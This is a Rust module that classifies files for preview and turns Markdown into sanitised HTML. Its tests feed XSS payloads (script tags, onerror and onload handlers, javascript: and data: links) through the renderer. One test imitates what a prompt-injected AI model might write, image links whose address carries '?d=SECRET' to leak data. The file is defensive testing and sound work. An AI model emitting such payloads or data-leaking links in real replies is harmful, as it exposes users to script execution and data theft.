//! What a file is and how it is shown: the kind of a preview from the name and the first bytes, and Markdown turned
//! into HTML that is safe to put in the page.
//!
//! Nothing here runs or opens a file. A Markdown document is parsed by `pulldown-cmark` and the HTML it produces is
//! passed through `ammonia`, an allow-list sanitiser, so the page never receives a script, an event handler, an
//! inline style or a link that is not `http`, `https` or `mailto`. Images inside a document are dropped: the page
//! allows no network or file images in a document, and an image is shown by opening the image itself.

use std::collections::HashSet;

use pulldown_cmark::{Options, Parser, html};
use serde::Serialize;

/// The most Markdown source that is rendered; a larger file is shown as text.
pub const MAX_MARKDOWN: usize = 2 * 1024 * 1024;
/// How many bytes at the start of a file decide whether it is text.
pub const SNIFF: usize = 8 * 1024;

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Content {
    Markdown,
    Image,
    Pdf,
    Video,
    Audio,
    Text,
    Binary,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct Classified {
    pub content: Content,
    /// The media type for `Image`, `Pdf`, `Video` and `Audio`; `text/plain` or `application/octet-stream` otherwise.
    pub mime: String,
    /// A language name for highlighting in the viewer and the editor, from the extension.
    pub language: Option<&'static str>,
}

fn extension(name: &str) -> String {
    name.rsplit_once('.').map(|(_, e)| e.to_ascii_lowercase()).unwrap_or_default()
}

/// The language of a source file by its extension, for syntax highlighting. `None` for plain text.
pub fn language_of(name: &str) -> Option<&'static str> {
    Some(match extension(name).as_str() {
        "rs" => "rust",
        "ts" | "mts" | "cts" => "typescript",
        "js" | "mjs" | "cjs" => "javascript",
        "json" => "json",
        "py" => "python",
        "go" => "go",
        "c" | "h" => "c",
        "cpp" | "cc" | "hpp" => "cpp",
        "java" => "java",
        "sh" | "bash" | "zsh" => "shell",
        "toml" => "toml",
        "yaml" | "yml" => "yaml",
        "html" | "htm" => "html",
        "css" => "css",
        "md" | "markdown" => "markdown",
        "sql" => "sql",
        "xml" => "xml",
        "zig" => "zig",
        "swift" => "swift",
        "kt" | "kts" => "kotlin",
        "rb" => "ruby",
        _ => return None,
    })
}

/// Whether `head` is text: valid UTF-8 (a character cut off at the end is allowed) and no NUL byte.
pub fn is_text(head: &[u8]) -> bool {
    if head.contains(&0) {
        return false;
    }
    match std::str::from_utf8(head) {
        Ok(_) => true,
        // An error with no length is a character that continues past the end of what was read.
        Err(e) => e.error_len().is_none(),
    }
}

/// The kind of preview for a file called `name` that starts with `head`.
pub fn classify(name: &str, head: &[u8]) -> Classified {
    let ext = extension(name);
    let by_ext = |content, mime: &str| Classified { content, mime: mime.into(), language: language_of(name) };
    // The magic bytes decide first: a name can lie, the bytes can not.
    if let Some(kind) = infer::get(head) {
        let mime = kind.mime_type();
        let content = match kind.matcher_type() {
            infer::MatcherType::Image => Some(Content::Image),
            infer::MatcherType::Video => Some(Content::Video),
            infer::MatcherType::Audio => Some(Content::Audio),
            _ if mime == "application/pdf" => Some(Content::Pdf),
            _ => None,
        };
        if let Some(content) = content {
            return Classified { content, mime: mime.into(), language: None };
        }
    }
    match ext.as_str() {
        // SVG is text and an image: it is shown as an image only, where a script in it cannot run.
        "svg" => by_ext(Content::Image, "image/svg+xml"),
        "mp4" | "m4v" => by_ext(Content::Video, "video/mp4"),
        "webm" => by_ext(Content::Video, "video/webm"),
        "mov" => by_ext(Content::Video, "video/quicktime"),
        "mp3" => by_ext(Content::Audio, "audio/mpeg"),
        "pdf" if head.starts_with(b"%PDF") => by_ext(Content::Pdf, "application/pdf"),
        "md" | "markdown" if is_text(head) => by_ext(Content::Markdown, "text/markdown"),
        _ if is_text(head) => by_ext(Content::Text, "text/plain"),
        _ => Classified { content: Content::Binary, mime: "application/octet-stream".into(), language: None },
    }
}

/// Markdown as HTML that is safe to put in the page. `None` when the source is larger than [`MAX_MARKDOWN`].
pub fn render_markdown(source: &str) -> Option<String> {
    if source.len() > MAX_MARKDOWN {
        return None;
    }
    let options = Options::ENABLE_TABLES | Options::ENABLE_STRIKETHROUGH | Options::ENABLE_TASKLISTS | Options::ENABLE_FOOTNOTES;
    let mut raw = String::with_capacity(source.len() * 3 / 2);
    html::push_html(&mut raw, Parser::new_ext(source, options));
    Some(sanitize(&raw))
}

/// The allow-list sanitiser: the tags a document needs, the schemes a link may use, no images, no styles, no scripts.
fn sanitize(raw: &str) -> String {
    let tags: HashSet<&str> = [
        "a", "p", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6", "ul", "ol", "li", "blockquote", "pre", "code", "em",
        "strong", "del", "table", "thead", "tbody", "tr", "th", "td", "sup", "div", "span", "input",
    ]
    .into_iter()
    .collect();
    let mut builder = ammonia::Builder::default();
    builder
        .tags(tags)
        .url_schemes(["http", "https", "mailto"].into_iter().collect())
        .link_rel(Some("noopener noreferrer"))
        // `class` is kept on code (the language of a fenced block) and nowhere else. An input is a task list's checkbox and
        // nothing else: every input comes out as a disabled checkbox, so one written by hand (no type, another type) is
        // never a field the person could fill or press.
        .add_tag_attributes("code", ["class"])
        .add_tag_attributes("input", ["type", "checked", "disabled"])
        .set_tag_attribute_value("input", "type", "checkbox")
        .set_tag_attribute_value("input", "disabled", "")
        .attribute_filter(|element, attribute, value| match (element, attribute) {
            ("code", "class") => value.starts_with("language-").then_some(value.into()),
            _ => Some(value.into()),
        });
    builder.clean(raw).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_kind_comes_from_the_bytes_before_the_name() {
        let png = [0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13, b'I', b'H', b'D', b'R'];
        assert_eq!(classify("photo.txt", &png).content, Content::Image, "a png named .txt is an image");
        assert_eq!(classify("photo.png", &png).mime, "image/png");
        assert_eq!(classify("doc.pdf", b"%PDF-1.7\n...").content, Content::Pdf);
        assert_eq!(classify("fake.pdf", b"just text").content, Content::Text, "a text file named .pdf is not a pdf");
        assert_eq!(classify("clip.mp4", b"\0\0\0\x18ftypmp42\0\0\0\0").content, Content::Video);
        assert_eq!(classify("logo.svg", b"<svg xmlns=\"http://www.w3.org/2000/svg\"/>").content, Content::Image);
    }

    #[test]
    fn text_is_utf8_without_nul_and_a_cut_character_counts() {
        assert!(is_text("héllo wörld".as_bytes()));
        let cut = &"héllo".as_bytes()[..2]; // 'h' and half of 'é'
        assert!(is_text(cut), "a character cut by the sniff window is still text");
        assert!(!is_text(b"abc\0def"));
        assert!(!is_text(&[0xFF, 0xFE, b'a']), "invalid UTF-8 in the middle is not text");
        assert_eq!(classify("data.bin", &[0xFF, 0xFE, 0x00, 0x01]).content, Content::Binary);
    }

    #[test]
    fn source_files_know_their_language() {
        assert_eq!(classify("main.rs", b"fn main() {}").language, Some("rust"));
        assert_eq!(classify("README.MD", b"# Hi").content, Content::Markdown);
        assert_eq!(classify("notes.txt", b"hello").language, None);
        assert_eq!(language_of("a.yaml"), Some("yaml"));
    }

    #[test]
    fn markdown_becomes_html() {
        let html = render_markdown("# Title\n\nSome *emphasis* and `code`.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n").unwrap();
        assert!(html.contains("<h1>Title</h1>"), "{html}");
        assert!(html.contains("<em>emphasis</em>"));
        assert!(html.contains("<li>one</li>"));
        assert!(html.contains("<table>"));
    }

    #[test]
    fn markdown_cannot_carry_a_script_a_handler_a_style_or_a_bad_link() {
        let html = render_markdown(
            "<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n[click](javascript:alert(1)) [ok](https://example.org)\n\n<div style=\"position:fixed\" onclick=\"x()\">d</div>\n\n![alt](https://example.org/a.png)\n\n<iframe src=\"https://evil\"></iframe>",
        )
        .unwrap();
        for bad in ["<script", "onerror", "onclick", "javascript:", "style=", "<img", "<iframe"] {
            assert!(!html.contains(bad), "{bad} survived: {html}");
        }
        assert!(html.contains("href=\"https://example.org\""));
        assert!(html.contains("rel=\"noopener noreferrer\""));
    }

    #[test]
    fn a_model_reply_cannot_load_a_resource_or_carry_a_script_or_a_data_link_through_the_renderer() {
        // What a model writes after an injected instruction: an image whose address carries data, every element that
        // loads something or runs something, and links that are not links. None of it may come out of the renderer.
        let reply = [
            "![x](https://example.org/a.png?d=SECRET)",
            "![ref][r]\n\n[r]: https://example.org/b.png?d=SECRET",
            "<img src=\"https://example.org/c.png?d=SECRET\" onerror=\"x()\">",
            "<picture><source srcset=\"https://example.org/d.png\"><img src=\"https://example.org/e.png\"></picture>",
            "<video src=\"https://example.org/v.mp4\" autoplay></video>",
            "<audio src=\"https://example.org/a.mp3\"></audio>",
            "<link rel=\"stylesheet\" href=\"https://example.org/s.css\">",
            "<meta http-equiv=\"refresh\" content=\"0;url=https://example.org/\">",
            "<base href=\"https://example.org/\">",
            "<object data=\"https://example.org/o\"></object>",
            "<embed src=\"https://example.org/e\">",
            "<svg onload=\"alert(1)\"><image href=\"https://example.org/i.png\"/></svg>",
            "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
            "<form action=\"https://example.org/post\"><input type=\"image\" src=\"https://example.org/f.png\"></form>",
            "[plain](javascript:alert(1)) [entity](javascript&#58;alert(1)) [data](data:text/html;base64,PHNjcmlwdD4=)",
            "<p style=\"background:url(https://example.org/bg.png)\">styled</p>",
            "<https://example.org/?d=1>",
        ]
        .join("\n\n");
        let html = render_markdown(&reply).unwrap();
        for bad in [
            "<img", "<picture", "<video", "<audio", "<source", "<link", "<meta", "<base", "<object", "<embed", "<svg", "<math",
            "<form", "src=", "srcset", "action=", "style=", "onload", "onerror", "javascript:", "data:", "xlink",
        ] {
            assert!(!html.contains(bad), "{bad} survived: {html}");
        }
        // An autolink stays a link with its address: the page decides what to do with an address that carries data.
        assert!(html.contains("<a href=\"https://example.org/?d=1\""), "{html}");
    }

    #[test]
    fn a_fenced_block_keeps_its_language_and_a_task_keeps_its_box() {
        let html = render_markdown("```rust\nfn main() {}\n```\n\n- [x] done\n- [ ] todo\n").unwrap();
        assert!(html.contains("class=\"language-rust\""), "{html}");
        assert!(html.contains("type=\"checkbox\""), "{html}");
        let other = render_markdown("<code class=\"evil\">x</code>").unwrap();
        assert!(!other.contains("evil"), "{other}");
    }

    #[test]
    fn a_stray_input_is_a_disabled_checkbox_and_nothing_else() {
        // A task list's box is the only input a reply may have. An input written by hand, with no type or with another one,
        // must not come out as a field the person could fill or press.
        for source in [
            "<input>",
            "<input type=\"text\" value=\"x\" name=\"q\">",
            "<input type=\"image\" src=\"https://example.org/f.png\">",
            "<input autofocus onfocus=\"x()\">",
            "- [ ] todo\n",
        ] {
            let html = render_markdown(source).unwrap();
            assert!(html.contains("<input"), "{source}: {html}");
            assert!(html.contains("type=\"checkbox\""), "{source}: {html}");
            assert!(html.contains("disabled"), "{source}: {html}");
            for bad in ["value=", "name=", "src=", "autofocus", "onfocus", "type=\"text\"", "type=\"image\""] {
                assert!(!html.contains(bad), "{source}: {bad} survived: {html}");
            }
        }
    }

    #[test]
    fn a_huge_document_is_not_rendered() {
        assert!(render_markdown(&"a".repeat(MAX_MARKDOWN + 1)).is_none());
    }
}
